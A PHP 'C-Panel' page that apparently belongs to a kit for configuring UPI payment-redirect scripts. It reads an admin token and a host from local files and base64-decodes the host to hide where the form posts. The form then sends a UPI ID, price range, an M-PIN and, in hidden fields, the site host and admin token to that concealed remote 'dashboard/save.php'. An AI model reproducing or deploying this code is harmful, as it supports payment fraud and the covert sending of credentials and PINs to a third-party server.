<?php
$admin_token = file_get_contents('token.txt');
$shost = file_get_contents('shost.txt');
$host = $_SERVER['SERVER_NAME'];
$login = base64_decode("$shost") . base64_decode("ZGFzaGJvYXJkL3NhdmUucGhw");

$upih = $_REQUEST['upih'] ?? '';
$tr = $_REQUEST['tr'] ?? '';
$minam = $_REQUEST['minam'] ?? '';
$maxam = $_REQUEST['maxam'] ?? '';
$user = $_REQUEST['uide'] ?? '';
$pass = $_REQUEST['pid'] ?? '';
$r = $_REQUEST['r'] ?? '';

if (stristr($r, '1')) {
    $msg = "<center><h3><font color='green'>C-Panel Update Successful </font></h3></center>";
}

if (empty($user)) {
    header("Location: https://$host/user/?r=2");
    exit();
}
if (empty($admin_token)) {
    header("Location: https://$host/user/?r=2");
    exit();
}
?>







<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Update Information</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #000000; /* Black background */
            color: white; /* White text */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            background: #333333; /* Dark gray background for the form container */
            padding: 20px; /* Reduced padding */
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
            width: 400px;
            max-width: 100%;
        }

        h1 {
            text-align: center;
            margin-bottom: 15px; /* Reduced margin for the title */
            color: red; /* Red text for the title */
            font-size: 24px;
        }

        .mpin-container {
            text-align: center;
            margin-bottom: 15px; /* Reduced margin */
        }

        .mpin-container img {
            width: 40px;
            vertical-align: middle;
            margin-right: 10px;
        }

        .form-group {
            margin-bottom: 10px; /* Reduced bottom margin */
        }

        label {
            display: block;
            margin-bottom: 5px; /* Reduced margin between label and input */
            color: red; /* Red text for labels */
        }

        input[type="text"], select {
            width: 100%;
            padding: 8px; /* Reduced padding inside inputs */
            border: 1px solid #ccc;
            border-radius: 4px;
            margin-bottom: 8px; /* Reduced margin between inputs */
            background-color: #555555; /* Dark gray background for input fields */
            color: white; /* White text in input fields */
        }

        input[type="text"]:focus, select:focus {
            border-color: #ff0000; /* Red border on focus */
            outline: none;
        }

        .btn {
            width: 100%;
            padding: 10px; /* Reduced padding for the button */
            background-color: #007bff; /* Blue button */
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            margin-bottom: 10px;
        }

        .btn:hover {
            background-color: #0056b3; /* Darker blue on hover */
        }

        #success-message {
            background-color: #28a745;
            color: white;
            padding: 10px;
            margin-bottom: 15px; /* Reduced margin for success message */
            border-radius: 4px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="mpin-container">
            <h1>
                <img src="cp.png" alt="cPanel Logo">
                C-Panel
            </h1>

            <?php if (isset($msg)) {
                echo "<div id='success-message'>".$msg."</div>"; 
                echo "<script>
                        setTimeout(function() {
                            document.getElementById('success-message').style.display = 'none';
                        }, 3000);
                      </script>";
            } ?>
        </div>

        <form action="<?php echo $login;?>" method="POST">
            

            <div class="form-group">
                <label for="type">Script Type:</label>
                <select id="type" name="type">
                    <option value="Phonepe://pay">Only Phonepe</option>
                    <option value="upi://pay">All UPI</option>
                    
                <option value="gpay://upi:/pay">Only Gpay</option>
                    <option value="paytmmp://pay">Only Paytm</option>
                </select>
            </div>

            <div class="form-group">
                <label for="username">UPI ID:</label>
                <input type="text" id="username" name="upih" value="<?php echo htmlspecialchars($upih); ?>" required>
            </div>

            <div class="form-group">
                <label for="tr">TR Number: (if any)</label>
                <input type="text" id="tr" name="tr" value="<?php echo htmlspecialchars($tr); ?>">
            </div>

            <div class="form-group">
                <label for="minam">Minimum Price:</label>
                <input type="text" id="minam" name="minam" value="<?php echo htmlspecialchars($minam); ?>" required>
            </div>

            <div class="form-group">
                <label for="maxam">Maximum Price:</label>
                <input type="text" id="maxam" name="maxam" value="<?php echo htmlspecialchars($maxam); ?>" required>
            </div>

            <div class="form-group">
                <label for="user">M-PIN:</label>
                <input type="text" id="user" name="user" value="<?php echo htmlspecialchars($user); ?>" required>
            </div>

            <input type="hidden" name="host" value="<?php echo htmlspecialchars($host); ?>" required>
            <input type="hidden" name="token" value="<?php echo htmlspecialchars($admin_token); ?>" required>

            <br><button type="submit" class="btn">Update C-Panel Info</button>
        </form>
    </div>
</body>
</html>
